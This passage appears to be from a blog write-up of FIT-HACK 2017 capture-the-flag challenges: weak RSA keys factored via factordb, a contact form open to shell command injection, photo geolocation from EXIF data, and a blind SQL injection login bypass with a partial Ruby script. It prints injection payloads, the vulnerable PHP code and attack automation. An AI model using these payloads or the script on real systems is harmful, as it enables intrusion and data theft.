+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ openssl rsa -in 39BCC1930B969051426F5864F24B478CEAFBA7D8/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=187FF1FE590C8978344D616720CC120A0EA7167</div><div class="line"></div><div class="line">$ openssl rsa -in 59E859397B1AB522AAF698D9D42D5F064FD11381/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=C12087AF41124167E5BF1325C0475ABD4170F</div><div class="line"></div><div class="line">$ openssl rsa -in 5A6DF720540C20D95D530D3FD6885511223D5D20/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=39C2A461DBF69484A2301380B398326DEE51D1</div><div class="line"></div><div class="line">$ openssl rsa -in 8090FD368C8382FD4B216C5BAA04C99769DFCC49/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=5D5E9F107FB13859D24C85773EA4FF8BEF8E99</div><div class="line"></div><div class="line">$ openssl rsa -in A1047EAB1035D58682A53557E0B2A75EDBFD15FD/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=1AACD3C90D1ABDFDDDDE1835F58A88F0368B9F</div><div class="line"></div><div class="line">$ openssl rsa -in C5E31D5915661DE4393E3F1489B00EBC4497DD48/publicfit.pem -pubin -modulus -noout</div><div class="line">Modulus=38AF31E598E242B5FCF1B306FDFF0E2D66EF239</div><div class="line"></div><div class="line">$ openssl rsa -in C9CF2EF3AD15705851D02C005B381171AF921BD7/fitkey.pem -pubin -modulus -noout</div><div class="line">Modulus=657A908426101AFA2551CFCA26E39AF5645327</div></pre></td></tr></table></figure></p>
+<p>We may be able to <a href="http://www.loyalty.org/~schoen/rsa/" target="_blank" rel="external">factorize it</a>.</p>
+<p>I made a ruby script that get the public keys, extract the modulus, get the prime factorization from factordb, and then create the private keys from p and q:</p>
+<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></div><div class="line"><span class="keyword">require</span> <span class="string">'net/http'</span></div><div class="line"></div><div class="line">key1 = OpenSSL::PKey::RSA.new File.read <span class="string">'39BCC1930B969051426F5864F24B478CEAFBA7D8/publicfit.pem'</span></div><div class="line">key2 = OpenSSL::PKey::RSA.new File.read <span class="string">'59E859397B1AB522AAF698D9D42D5F064FD11381/publicfit.pem'</span></div><div class="line">key3 = OpenSSL::PKey::RSA.new File.read <span class="string">'5A6DF720540C20D95D530D3FD6885511223D5D20/publicfit.pem'</span></div><div class="line">key4 = OpenSSL::PKey::RSA.new File.read <span class="string">'8090FD368C8382FD4B216C5BAA04C99769DFCC49/publicfit.pem'</span></div><div class="line">key5 = OpenSSL::PKey::RSA.new File.read <span class="string">'A1047EAB1035D58682A53557E0B2A75EDBFD15FD/publicfit.pem'</span></div><div class="line">key6 = OpenSSL::PKey::RSA.new File.read <span class="string">'C5E31D5915661DE4393E3F1489B00EBC4497DD48/publicfit.pem'</span></div><div class="line">key7 = OpenSSL::PKey::RSA.new File.read <span class="string">'C9CF2EF3AD15705851D02C005B381171AF921BD7/fitkey.pem'</span></div><div class="line"></div><div class="line">keys = [key1, key2, key3, key4, key5, key6, key7]</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">ask</span><span class="params">(key)</span></span></div><div class="line">    uri = URI(<span class="string">'http://factordb.com/index.php'</span>)</div><div class="line">    params = &#123; <span class="symbol">:query</span> =&gt; key.n.to_s &#125;</div><div class="line">    uri.query = URI.encode_www_form(params)</div><div class="line">    http = Net::HTTP.new(uri.host, uri.port)</div><div class="line">    res = http.get(uri)</div><div class="line">    <span class="keyword">return</span> res.body</div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_pq</span><span class="params">(key)</span></span></div><div class="line">    n<span class="number">_</span>, p<span class="number">_</span>, q<span class="number">_</span> = ask(key).match(<span class="regexp">/&lt;font color="#002099"&gt;([0-9]*)&lt;\/font&gt;&lt;\/a&gt;&lt;sub&gt;&amp;lt;.*&amp;gt;&lt;\/sub&gt; = &lt;a href=".*"&gt;&lt;font color="#000000"&gt;([0-9]*)&lt;\/font&gt;&lt;\/a&gt;&lt;sub&gt;&amp;lt;.*&amp;gt;&lt;\/sub&gt; &amp;middot; &lt;a href=".*"&gt;&lt;font color="#000000"&gt;([0-9]*)&lt;\/font&gt;/</span>).captures</div><div class="line">    puts <span class="string">"n: <span class="subst">#&#123;n<span class="number">_</span>&#125;</span>"</span></div><div class="line">    puts <span class="string">"p: <span class="subst">#&#123;p<span class="number">_</span>&#125;</span>"</span></div><div class="line">    puts <span class="string">"q: <span class="subst">#&#123;q<span class="number">_</span>&#125;</span>"</span></div><div class="line">    <span class="keyword">return</span> p<span class="number">_</span>, q<span class="number">_</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_key_pem</span><span class="params">(p<span class="number">_</span>,q<span class="number">_</span>,i=<span class="number">0</span>)</span></span></div><div class="line">    <span class="string">`python2 /home/noraj/CTF/tools/rsatool/rsatool.py -f PEM -o /home/noraj/CTF/FIT-HACK/2017/files/key<span class="subst">#&#123;i&#125;</span>.pem -p <span class="subst">#&#123;p<span class="number">_</span>&#125;</span> -q <span class="subst">#&#123;q<span class="number">_</span>&#125;</span>`</span></div><div class="line"><span class="keyword">end</span></div><div class="line"></div><div class="line">keys.each_with_index <span class="keyword">do</span> <span class="params">|k, i|</span></div><div class="line">    puts <span class="string">"key<span class="subst">#&#123;i+<span class="number">1</span>&#125;</span>:"</span></div><div class="line">    p<span class="number">_</span>, q<span class="number">_</span> = get_pq(k)</div><div class="line">    write_key_pem(p<span class="number">_</span>,q<span class="number">_</span>,i+<span class="number">1</span>)</div><div class="line"><span class="keyword">end</span></div></pre></td></tr></table></figure></p>
+<p>Here is the output of my script:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line">key1:</div><div class="line">n: 8741815859436417328701496607875318191936401767</div><div class="line">p: 62327402947945346311733</div><div class="line">q: 140256379152159036259499</div><div class="line">key2:</div><div class="line">n: 269179849221158109026551637984026302390474511</div><div class="line">p: 14414794469577771744263</div><div class="line">q: 18673859678627990887097</div><div class="line">key3:</div><div class="line">n: 1288098196172411883559600628392142705366290897</div><div class="line">p: 35304226904821143403853</div><div class="line">q: 36485665006773148185749</div><div class="line">key4:</div><div class="line">n: 2082211985167937929231221000305276937818836633</div><div class="line">p: 35841260054322958986347</div><div class="line">q: 58095390117758818595339</div><div class="line">key5:</div><div class="line">n: 594874755164348689388321012976760936405044127</div><div class="line">p: 15907423136267341555433</div><div class="line">q: 37396047748808130517319</div><div class="line">key6:</div><div class="line">n: 20225653762860501316298024024116880883063910969</div><div class="line">p: 138769550589434889129983</div><div class="line">q: 145749940653049615039943</div><div class="line">key7:</div><div class="line">n: 2263052140251833682660205913396239536442594087</div><div class="line">p: 32133336765473179918313</div><div class="line">q: 70426926303011627974799</div></pre></td></tr></table></figure></p>
+<p>Now let's decipher flag's fragments:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key1.pem; cat plaintext</div><div class="line">vc7tJ</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key2.pem; cat plaintext</div><div class="line">ohvwv</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key3.pem; cat plaintext</div><div class="line">FIT&#123;</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key4.pem; cat plaintext</div><div class="line">Zyapo</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key5.pem; cat plaintext</div><div class="line">__dOSA</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in mfit -out plaintext -inkey key6.pem; cat plaintext</div><div class="line">Ai85Z</div><div class="line"></div><div class="line">$ openssl rsautl -decrypt -in fit -out plaintext -inkey key7.pem; cat plaintext</div><div class="line">J1RuW&#125;</div></pre></td></tr></table></figure></p>
+<p>Now I need to re-order flag's fragments.</p>
+<p>But look! Foldername looks like a hash:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ hashid 39BCC1930B969051426F5864F24B478CEAFBA7D8</div><div class="line">Analyzing &apos;39BCC1930B969051426F5864F24B478CEAFBA7D8&apos;</div><div class="line">[+] SHA-1</div><div class="line">[+] Double SHA-1</div><div class="line">[+] RIPEMD-160</div><div class="line">[+] Haval-160</div><div class="line">[+] Tiger-160</div><div class="line">[+] HAS-160</div><div class="line">[+] LinkedIn</div><div class="line">[+] Skein-256(160)</div><div class="line">[+] Skein-512(160)</div></pre></td></tr></table></figure></p>
+<p>So its probably SHA1.</p>
+<p>Now I used <a href="https://hashkiller.co.uk/sha1-decrypter.aspx" target="_blank" rel="external">hashkiller</a> to break them:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">39bcc1930b969051426f5864f24b478ceafba7d8 SHA1 : v6</div><div class="line">59e859397b1ab522aaf698d9d42d5f064fd11381 SHA1 : v5</div><div class="line">5a6df720540c20d95d530d3fd6885511223d5d20 SHA1 : v1</div><div class="line">8090fd368c8382fd4b216c5baa04c99769dfcc49 SHA1 : v4</div><div class="line">a1047eab1035d58682a53557e0b2a75edbfd15fd SHA1 : v2</div><div class="line">c5e31d5915661de4393e3f1489b00ebc4497dd48 SHA1 : v3</div><div class="line">c9cf2ef3ad15705851d02c005b381171af921bd7 SHA1 : v7</div></pre></td></tr></table></figure></p>
+<p>So in order:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">$ cat 5A6DF720540C20D95D530D3FD6885511223D5D20/plaintext</div><div class="line">FIT&#123;</div><div class="line"></div><div class="line">$ cat A1047EAB1035D58682A53557E0B2A75EDBFD15FD/plaintext</div><div class="line">__dOSA</div><div class="line"></div><div class="line">$ cat C5E31D5915661DE4393E3F1489B00EBC4497DD48/plaintext</div><div class="line">Ai85Z</div><div class="line"></div><div class="line">$ cat 8090FD368C8382FD4B216C5BAA04C99769DFCC49/plaintext</div><div class="line">Zyapo</div><div class="line"></div><div class="line">$ cat 59E859397B1AB522AAF698D9D42D5F064FD11381/plaintext</div><div class="line">ohvwv</div><div class="line"></div><div class="line">$ cat 39BCC1930B969051426F5864F24B478CEAFBA7D8/plaintext</div><div class="line">vc7tJ</div><div class="line"></div><div class="line">$ cat C9CF2EF3AD15705851D02C005B381171AF921BD7/plaintext</div><div class="line">J1RuW&#125;</div></pre></td></tr></table></figure></p>
+<p>So our flag is: <code>FIT{__dOSAAi85ZZyapoohvwvvc7tJJ1RuW}</code>.</p>
+<p>But it is incorrect!! What a troll!</p>
+<p>Warning big guessing!!! Remove all double letters to get:  <code>FIT{__dOSAi85Zyapohvwvc7tJ1RuW}</code>.</p>
+<h2 id="150-sorry-web">150 - Sorry - Web</h2>
+<blockquote>
+<p>Flag is right there.</p>
+<p><a href="https://sorry.problem.ctf.nw.fit.ac.jp/" target="_blank" rel="external">https://sorry.problem.ctf.nw.fit.ac.jp/</a></p>
+</blockquote>
+<p>There is a command shell injection the contact form: <a href="https://sorry.problem.ctf.nw.fit.ac.jp/form.html" target="_blank" rel="external">https://sorry.problem.ctf.nw.fit.ac.jp/form.html</a></p>
+<p>For example sendingg the following payload <code>ls -lA;#</code> resultats into:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">total 28</div><div class="line">-r-x---r-x 1 root root   0 Apr 11 00:04 damy.txt</div><div class="line">-r-x---r-x 1 root root  40 Apr 11 00:04 eng.txt</div><div class="line">-r-x---r-x 1 root root 462 Apr 11 00:04 form.html</div><div class="line">-r-x---r-x 1 root root 250 Apr 11 00:04 from.css</div><div class="line">-r-x---r-x 1 root root   0 Apr 11 00:04 in.css</div><div class="line">-r-x---r-x 1 root root 181 Apr 11 00:04 in.php</div><div class="line">-r-x---r-x 1 root root   0 Apr 11 00:04 in.pjp</div><div class="line">-r-x---r-x 1 root root 170 Apr 11 00:04 index.css</div><div class="line">-r-x---r-x 1 root root 811 Apr 11 00:04 index.php</div><div class="line">-r-x---r-x 1 root root  58 Apr 11 00:04 jpn.txt</div><div class="line">-r-x---r-x 1 root root  58 Apr 11 00:04 jpn.txtls -lA;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<p>I'm just curious, <code>cat index.php;#</code> gives:</p>
+<p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$name_i = $_GET[<span class="string">'name'</span>];</div><div class="line">$ka = <span class="string">".txt"</span>;</div><div class="line">$text_file = $name_i.$ka;</div><div class="line"></div><div class="line">$name_j = file_get_contents($text_file);;</div><div class="line"></div><div class="line"><span class="keyword">echo</span> $name_j;</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"></div><div class="line">&lt;!DOCTYPE html&gt;</div><div class="line">&lt;html lang=<span class="string">"en"</span>&gt;</div><div class="line"></div><div class="line">[...]</div></pre></td></tr></table></figure></p>
+<p>And <code>cat in.php;#</code> gives:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">&lt;?php</div><div class="line"></div><div class="line">$com = $_POST[&apos;etc&apos;];</div><div class="line">$mail = &apos;:mail@example.com&apos;;</div><div class="line">$mc = $com.$mail;</div><div class="line"></div><div class="line">function jug($mc)&#123;</div><div class="line"></div><div class="line">    echo system($mc);</div><div class="line">    echo $mc.&apos; &apos;.&apos;&lt;br&gt;&apos;.&apos;Saved it thank you!!&apos;;</div><div class="line">&#125;</div><div class="line"></div><div class="line">jug($mc);</div><div class="line">?&gt;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">cat in.php;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<p>Now let's find the flag:</p>
+<p><code>ls -lA /tmp/;#</code>:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">total 8</div><div class="line">drwxrwxrwt 2 root   root   4096 Apr  9 20:31 .ICE-unix</div><div class="line">-rwxr-xr-x 1 root   root     23 Apr 11 00:04 .flag</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 07:07 a.php</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 07:06 a.php*</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 03:21 bee-shell.php</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 01:52 lol2.txt</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 06:06 shell.php</div><div class="line">-rw-r--r-- 1 apache apache    0 Apr 12 06:06 shell.phpls -lA /tmp/;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<p><code>cat /tmp/.flag</code> gives us <code>FIT{fdsa__dasdas_32fa}</code>.</p>
+<p>Another method is <code>grep -r 'FIT{' /*#</code>:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/dev/shm/lol.txt:FIT&#123;fdsa__dasdas_32fa&#125;</div><div class="line">/dev/shm/lol.txt:FIT&#123;fdsa__dasdas_32fa&#125;</div><div class="line">Binary file /proc/17860/task/17860/cmdline matches</div><div class="line">Binary file /proc/17860/task/17860/cmdline matchesgrep -r &apos;FIT&#123;&apos; /*;#:mail@example.com &lt;br&gt;Saved it thank you!!</div></pre></td></tr></table></figure></p>
+<h2 id="50-be-a-stalker-recon">50 - Be a stalker - Recon</h2>
+<p>Twitter account: <a href="https://twitter.com/FitHack_CTF" target="_blank" rel="external">https://twitter.com/FitHack_CTF</a></p>
+<p>Profile picture:</p>
+<p><img src="https://pbs.twimg.com/profile_images/834301095476228098/1wivmfqi.jpg" alt=""></p>
+<p>Flag is <code>FIT{DrPepper}</code>.</p>
+<h2 id="100-specific-recon">100 - Specific - Recon</h2>
+<blockquote>
+<p>This picture was taken from the top of the bridge.</p>
+<p>Please specify the name of the bridge in lowercase letters of Roman letters.</p>
+<p>Flag format is FIT{[answer]}</p>
+<p><a href="https://ctf.nw.fit.ac.jp/files/88309a0cb116e29f3ba062a7f9243d6a/photo.zip" target="_blank" rel="external">photo.zip</a></p>
+</blockquote>
+<p>I checked exif metadata and there were GPS location:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">$ exiftool photo.jpg | grep -i gps</div><div class="line">GPS Latitude Ref                : North</div><div class="line">GPS Longitude Ref               : East</div><div class="line">GPS Time Stamp                  : 00:50:28</div><div class="line">GPS Date Stamp                  : 2017:02:19</div><div class="line">GPS Date/Time                   : 2017:02:19 00:50:28Z</div><div class="line">GPS Latitude                    : 31 deg 49&apos; 25.90&quot; N</div><div class="line">GPS Longitude                   : 130 deg 18&apos; 52.86&quot; E</div><div class="line">GPS Position                    : 31 deg 49&apos; 25.90&quot; N, 130 deg 18&apos; 52.86&quot; E</div></pre></td></tr></table></figure></p>
+<p>So I looked at <a href="http://www.findlatitudeandlongitude.com/?lat=31.823861&amp;lon=130.314683&amp;zoom=&amp;map_type=ROADMAP" target="_blank" rel="external">findlatitudeandlongitude.com</a> the GPS position.</p>
+<p>The approximate address is: <em>36-17 Higashiōshōjichō, Satsumasendai-shi, Kagoshima-ken 895-0075, Japan</em> from the brigde the picture is taken from.</p>
+<p>The bridge is over <em>Sendai River</em>.</p>
+<p>I looked at the bridge on different websites, but othing on Google Maps, Bing Map, Yandex Map, OpenStreetMap, HERE, MapQuest, <a href="http://mapy.cz" target="_blank" rel="external">mapy.cz</a>, Wikimapia, GeoHack.</p>
+<p>After on <a href="https://tools.wmflabs.org/geohack/geohack.php?language=en&amp;pagename=%E8%A5%BF%E5%90%91%E7%94%B0%E7%94%BA&amp;params=31_48_58.8_N_130_18_20.1_E_type:city" target="_blank" rel="external">geohack</a> I saw there was specialized maps for certain country, so I tried japan only map services: Mapion, MapFan Web, Yahoo! Japan, Goo, Its-mo Guide.</p>
+<p>There was the name but in Japan (Kanji) charaters.</p>
+<p>During this time, I found the name <em>tentai-bashi bridge</em> on an random website so I tried <code>FIT{tentai-bashi}</code>, <code>FIT{tentai_bashi}</code> and <code>FIT{tentai}</code> and then gave up, thinking that was not the good flag (no spoil now, it was lucky this was a random not famous site).</p>
+<p>So I came back to one of the japan specialized map <a href="https://travel.mapfan.com/lang/en/spot/654" target="_blank" rel="external">mapfan</a> and others.</p>
+<p>I took screenshot of the 3 charaters:</p>
+<p><img src="http://i.imgur.com/ZO6TTDY.png" alt="">
+<img src="http://i.imgur.com/GcNpPh9.png" alt="">
+<img src="http://i.imgur.com/iZnt9FB.png" alt="">
+<img src="http://i.imgur.com/Wag7wi7.png" alt=""></p>
+<p>Then I zoomed and tried hand written recognition: <a href="http://kanji.sljfaq.org/" target="_blank" rel="external">http://kanji.sljfaq.org/</a></p>
+<p>That didn't work at all, there a lot of same character that look nearly the same.</p>
+<p>Then I thought about OCR.</p>
+<p>I tried <a href="http://www.i2ocr.com/free-online-japanese-ocr" target="_blank" rel="external">http://www.i2ocr.com/free-online-japanese-ocr</a> tha tworked badly and gave me only of the 3 chars: <code>天</code> and <code>橋</code>. I found the third with hand written recognition <code>六</code>.</p>
+<p>Google translate to english:</p>
+<ul>
+<li>天六橋 -&gt; Heaven Bridge (Tenroku-bashi)</li>
+</ul>
+<p>Now we need Roman representation of Kanji, not english translation:</p>
+<p>So I tried <a href="http://nihongo.j-talk.com/" target="_blank" rel="external">http://nihongo.j-talk.com/</a> that gave me:</p>
+<ul>
+<li>Kanji =&gt; Rōmaji
+<ul>
+<li>天六 -&gt; Ten roku</li>
+<li>天六橋 -&gt; Ten roku kyō</li>
+</ul>
+</li>
+<li>Kanji -&gt; Roumaji
+<ul>
+<li>天六橋 -&gt; Ten roku kyou</li>
+</ul>
+</li>
+</ul>
+<p>But nothing was the flag.</p>
+<p>The 2nd char doesn't looks exactly the same, in fact the good one is <code>大</code> not <code>六</code>.</p>
+<p>Thanks to <a href="http://maggie.ocrgrid.org/nhocr/" target="_blank" rel="external">http://maggie.ocrgrid.org/nhocr/</a> I found the good one.</p>
+<p>So we have now <code>天大橋</code> in Kanji.</p>
+<p><a href="https://translate.google.fr/#ja/en/%E5%A4%A9%E5%A4%A7%E6%A9%8B" target="_blank" rel="external">Google translate</a> gave me:</p>
+<ul>
+<li>天大橋 -&gt; Heaven Bridge (Tentaibashi)</li>
+</ul>
+<p><code>FIT{tentaibashi}</code> is the good flag. I was soooooo near I tried <code>FIT{tentai-bashi}</code>.</p>
+<p>I tried again (with the good 2nd char this time) <a href="http://nihongo.j-talk.com/:" target="_blank" rel="external">http://nihongo.j-talk.com/:</a></p>
+<ul>
+<li>Kanji -&gt; Rōmaji
+<ul>
+<li>天大橋 -&gt; Ten ōhashi</li>
+</ul>
+</li>
+<li>Kanji -&gt; Roumaji
+<ul>
+<li>天大橋 -&gt; Ten oohashi</li>
+</ul>
+</li>
+</ul>
+<p>But the roman translation was not the one I was looking for.</p>
+<p>Meanwhile, CTF orga released twohint:</p>
+<ul>
+<li>Hint 1: Google street view</li>
+<li>Hint 2: Google translate from picture</li>
+</ul>
+<p>Early I tried to find the name of the bridge on Google Street View but didn't found it.</p>
+<h2 id="150-let-s-login-web">150 - Let's login - Web</h2>
+<blockquote>
+<p>I created a page with a login function, but it seems to be vulnerable.</p>
+<p><a href="https://login.problem.ctf.nw.fit.ac.jp" target="_blank" rel="external">https://login.problem.ctf.nw.fit.ac.jp</a></p>
+</blockquote>
+<p>Here is the login page: <a href="https://login.problem.ctf.nw.fit.ac.jp/login.php" target="_blank" rel="external">https://login.problem.ctf.nw.fit.ac.jp/login.php</a></p>
+<p>Using these credentials:</p>
+<ul>
+<li>pseudo: <code>' or 1=1 -- -</code></li>
+<li>password: <code>a</code></li>
+</ul>
+<p>Gave me the following message:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">Password is a flag</div><div class="line">Table name: user</div><div class="line">Column name: name, pass</div></pre></td></tr></table></figure></p>
+<p>Thanks for the help.</p>
+<p>Now let's try a different payload <code>' or 1=1#</code>, That give me a blank page.</p>
+<p>So I think this is a blind SQLi where we have the hint message when the request is true and a blank page when false (or auth failure).</p>
+<p>Lets write a blind SQL injection script in ruby.</p>
+<p>So we want a payload like this <code>' or 1=1 UNION select name,pass from user-- -</code>.</p>
+<p>To get the content we will need some SQLite features (because yes it's an SQLite database):</p>
+<ul>
+<li><code>length(str)</code> = to retrieve strings length</li>
+<li><code>substr( string, start_position, [ length ] )</code> and sub-queries to retrieve strings content</li>
+</ul>
+<p>' or length((select name from user limit 1)) &lt; 1-- -
+' or length((select pass from user limit 1)) &lt; 1-- -</p>
+<p>Here is my script:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div></pre></td><td class="code"><pre><div class="line">require &apos;net/https&apos;</div><div class="line"># uri is already require by net/https</div><div class="line"></div><div class="line">uri = URI(&apos;https://login.problem.ctf.nw.fit.ac.jp/login.php&apos;)</div><div class="line"></div><div class="line">req = Net::HTTP::Post.new(uri.path)</div><div class="line">#req.set_form_data(&apos;name&apos; =&gt; payload, &apos;pass&apos; =&gt; &apos;vuln&apos;)</div><div class="line"></div><div class="line">http = Net::HTTP.new(uri.host, uri.port)</div><div class="line">http.use_ssl = true</div><div class="line">http.verify_mode = OpenSSL::SSL::VERIFY_NONE</div><div class="line">#res = http.request(req)</div><div class="line"></div><div class="line">&lt;&lt;-DOC</div><div class="line">Check is the payload expression is true or false.</div><div class="line">DOC</div><div class="line"></div><div class="line">def check_expression(uri, http, req, payload)</div><div class="line">  req.set_form_data(&apos;name&apos; =&gt; payload, &apos;pass&apos; =&gt; &apos;vuln&apos;)</div><div class="line">  res = http.request(req)</div><div class="line">  return /Password is a flag/.match?(res.body)</div><div class="line">end</div><div class="line"></div><div class="line">&lt;&lt;-DOC</div><div class="line">Get the length of the string.</div><div class="line">There is two level of increment: 10 by 10 (to be faster) and then 1 by 1 (to 